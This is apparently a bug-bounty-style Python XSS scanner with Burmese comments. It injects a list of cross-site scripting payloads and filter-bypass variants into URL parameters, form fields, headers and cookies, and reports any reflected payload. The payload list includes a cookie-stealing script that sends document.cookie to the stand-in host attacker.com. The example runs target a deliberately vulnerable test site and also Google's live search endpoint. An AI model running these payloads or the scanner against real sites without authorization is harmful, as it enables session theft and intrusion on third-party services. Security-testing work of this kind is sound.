import requests
from urllib.parse import urlparse, urlunparse, parse_qs, urlencode
import time

# XSS Payloads တွေ
# Bug Bounty မှာဆိုရင် ဒါမျိုးတွေကို text file တွေကနေ load လုပ်တာ ပိုကောင်းပါတယ်။
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<iframe srcdoc='<script>alert(1)</script>'>",
    "<img src=x onmouseover=alert(1)>",
    "<a href=\"javascript:alert(1)\">Click Me</a>",
    "<input type=\"text\" value=\"\" onfocus=\"alert(1)\">",
    "';!--\"<XSS>=&{()}",  # Basic test string for reflection
    # Example of cookie stealing
    "<script>window.location='http://attacker.com/?cookie='+document.cookie</script>",
    "<marquee><script>alert(1)</script></marquee>",  # Obfuscation example
    "<div oncontextmenu='alert(1)'>Right click me</div>",
]

# Common XSS filtering bypass techniques (optional, can be added later)
XSS_BYPASS_PAYLOADS = [
    "<ScRipT>alert(1)</sCriPt>",  # Case manipulation
    "<%0Ascript>alert(1)</script>",  # Newline char
    "<img%20src%3Dx%20onerror%3Dalert(1)>",  # URL encoding
    # HTML entity encoding
    "<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>",
    "javascript:/*--!*/alert(1)",  # Obfuscation
]


def send_request(url, method, params=None, data=None, headers=None, cookies=None, timeout=10):
    """
    HTTP request တစ်ခုကို ပို့ပြီး response ကို return လုပ်ပါတယ်။
    """
    try:
        if method.upper() == "GET":
            response = requests.get(
                url, params=params, headers=headers, cookies=cookies, timeout=timeout)
        elif method.upper() == "POST":
            response = requests.post(
                url, data=data, json=params, headers=headers, cookies=cookies, timeout=timeout)
        else:
            return None
        return response
    except requests.exceptions.RequestException as e:
        # print(f"    Request failed: {e}")
        return None


def test_xss_payload(url, method, base_params, param_name, original_value, payload):
    """
    Payload တစ်ခုနဲ့ စစ်ဆေးပြီး XSS vulnerability ရှိမရှိ စစ်ဆေးပါတယ်။
    """
    test_params = base_params.copy()
    test_params[param_name] = str(original_value) + payload

    response = send_request(url, method, params=test_params if method.upper() == "GET" else None,
                            data=test_params if method.upper() == "POST" else None)

    if not response:
        return None

    # Check if the payload is reflected in the response body
    if payload.lower() in response.text.lower():
        # A simple check: if the exact payload is found, it might be reflected.
        # This is a basic check and can result in false positives or false negatives.
        # More advanced checks would involve parsing HTML and checking if it's within a script context.
        print(
            f"[!!!] Potential XSS Vulnerability detected for '{param_name}' with payload '{payload}'")
        return f"XSS Vulnerability: {param_name} -> {payload}"
    return None


def find_xss_vulnerabilities(url, method="GET", initial_params=None, initial_data=None, initial_headers=None, initial_cookies=None):
    """
    XSS vulnerability ကို ရှာဖွေပါတယ်။
    """
    found_vulnerabilities = []

    # Define targets to test (GET, POST, Headers, Cookies)
    test_targets = []

    # 1. Test GET parameters
    if method.upper() == "GET" and initial_params:
        test_targets.append(("GET_PARAM", initial_params))
    # 2. Test POST parameters
    if method.upper() == "POST" and initial_data:
        test_targets.append(("POST_PARAM", initial_data))
    # 3. Test Headers (simplified: only User-Agent for example)
    if initial_headers:
        # Only test a few common headers that are likely to be reflected
        headers_to_test = {"User-Agent": initial_headers.get("User-Agent", "Mozilla/5.0 XSS_Scanner"),
                           "Referer": initial_headers.get("Referer", url)}
        test_targets.append(("HEADER", headers_to_test))
    # 4. Test Cookies (simplified)
    if initial_cookies:
        test_targets.append(("COOKIE", initial_cookies))

    if not test_targets:
        print("No parameters, headers, or cookies provided to test.")
        return []

    print(f"[*] Starting XSS scan for: {url} ({method})")

    for target_type, target_dict in test_targets:
        print(f"\n--- Testing {target_type} ---")
        for param_name, original_value in target_dict.items():
            for payload in XSS_PAYLOADS:  # You can also add XSS_BYPASS_PAYLOADS here
                print(
                    f"  Testing {target_type} '{param_name}' with payload: '{payload[:50]}...'")

                test_params = None
                test_data = None
                test_headers = initial_headers.copy() if initial_headers else {}
                test_cookies = initial_cookies.copy() if initial_cookies else {}

                if target_type == "GET_PARAM":
                    test_params = initial_params.copy()
                    test_params[param_name] = str(original_value) + payload
                elif target_type == "POST_PARAM":
                    test_data = initial_data.copy()
                    test_data[param_name] = str(original_value) + payload
                elif target_type == "HEADER":
                    test_headers[param_name] = str(original_value) + payload
                elif target_type == "COOKIE":
                    test_cookies[param_name] = str(original_value) + payload

                response = send_request(url, method, params=test_params, data=test_data,
                                        headers=test_headers, cookies=test_cookies)

                if not response:
                    continue

                # Check for reflection
                if payload.lower() in response.text.lower():
                    print(
                        f"  [!!!] Potential XSS Vulnerability detected in {target_type} '{param_name}' with payload '{payload}'!")
                    found_vulnerabilities.append(
                        f"XSS Vulnerability in {target_type}: {param_name} -> {payload}")

    if found_vulnerabilities:
        print("\n[!!!] XSS Vulnerabilities Found:")
        for vuln in set(found_vulnerabilities):
            print(f"  - {vuln}")
    else:
        print("\n[*] No obvious XSS vulnerabilities found.")
    return found_vulnerabilities


# --- အသုံးပြုပုံ ဥပမာများ ---
if __name__ == "__main__":
    # Test case 1: GET request (Hypothetical vulnerable search page)
    # Note: Replace with your actual target URL and parameters.
    # For ethical hacking, ensure you have permission to test.
    print("\n--- Testing GET Request ---")
    find_xss_vulnerabilities(
        # This is a known vulnerable site for testing
        "http://testphp.vulnweb.com/search.php",
        method="GET",
        initial_params={"query": "test"}
    )

    # Test case 2: POST request (Hypothetical vulnerable comment form)
    print("\n--- Testing POST Request ---")
    find_xss_vulnerabilities(
        # This is a known vulnerable site for testing (guestbook/comment section)
        "http://testphp.vulnweb.com/guestbook.php",
        method="POST",
        initial_data={"name": "Test User", "comment": "Hello"}
    )

    # Test case 3: Testing Headers (Hypothetical)
    print("\n--- Testing Headers ---")
    find_xss_vulnerabilities(
        "http://testphp.vulnweb.com/index.php",  # Example site
        method="GET",
        initial_headers={"User-Agent": "XSS_UA", "Referer": "XSS_REF"}
    )

    # Test case 4: Non-vulnerable site (Google Search)
    print("\n--- Testing a non-vulnerable site (Google) ---")
    find_xss_vulnerabilities(
        "https://www.google.com/search",
        method="GET",
        initial_params={"q": "test"}
    )
